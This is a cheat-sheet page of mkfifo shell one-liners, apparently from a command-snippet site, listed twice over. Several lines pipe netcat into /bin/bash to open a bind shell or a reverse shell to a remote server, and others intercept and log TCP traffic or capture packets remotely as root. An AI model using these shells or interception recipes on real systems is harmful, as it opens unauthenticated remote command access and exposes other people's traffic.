# mkfifo

##### Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat

   mkfifo  foo ; nc -lk 2600 0<foo | /bin/bash 1>foo

##### execute a shell with netcat without -e

   mkfifo  ._b; nc -lk 4201 0<._b | /bin/bash &>._b;

##### Intercept, monitor and manipulate a TCP connection.

   mkfifo  /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine port | tee -a from.log > /tmp/fifo

##### Network Proxy to dump the application level forward traffic in plain text in the console and in a file.

   mkfifo  fifo; while true ; do      echo "Waiting for new event";     nc -l 8080 < fifo | tee -a proxy.txt /dev/stderr | nc 192.168.0.1 80 > fifo ;  done

##### Viewable terminal session over network.

   mkfifo  /tmp/view; nc -l 9876 < /tmp/view& script -f /tmp/view

##### Share your terminal session real-time

   mkfifo  foo; script -f foo

##### analyze traffic remotely over ssh w/ wireshark

   mkfifo  /tmp/fifo; ssh-keygen; ssh-copyid root@remotehostaddress; sudo ssh root@remotehost "tshark -i eth1 -f 'not tcp port 22' -w -" > /tmp/fifo &; sudo wireshark -k -i /tmp/fifo;

##### execute a shell with netcat without -e

   mkfifo  pipe && nc remote_server 1337 <pipe | /bin/bash &>pipe

##### Emulating netcat -e (netcat-traditional or netcat-openbsd) with the gnu-netcat

   mkfifo  foo ; nc -lk 2600 0<foo | /bin/bash 1>foo

##### Intercept, monitor and manipulate a TCP connection.

   mkfifo  /tmp/fifo; cat /tmp/fifo | nc -l -p 1234 | tee -a to.log | nc machine port | tee -a from.log > /tmp/fifo

##### Network Proxy to dump the application level forward traffic in plain text in the console and in a file.

   mkfifo  fifo; while true ; do      echo "Waiting for new event";     nc -l 8080 < fifo | tee -a proxy.txt /dev/stderr | nc 192.168.0.1 80 > fifo ;  done

##### Viewable terminal session over network.

   mkfifo  /tmp/view; nc -l 9876 < /tmp/view& script -f /tmp/view

##### Share your terminal session real-time

   mkfifo  foo; script -f foo

##### analyze traffic remotely over ssh w/ wireshark

   mkfifo  /tmp/fifo; ssh-keygen; ssh-copyid root@remotehostaddress; sudo ssh root@remotehost "tshark -i eth1 -f 'not tcp port 22' -w -" > /tmp/fifo &; sudo wireshark -k -i /tmp/fifo;

##### execute a shell with netcat without -e

   mkfifo  pipe && nc remote_server 1337 <pipe | /bin/bash &>pipe
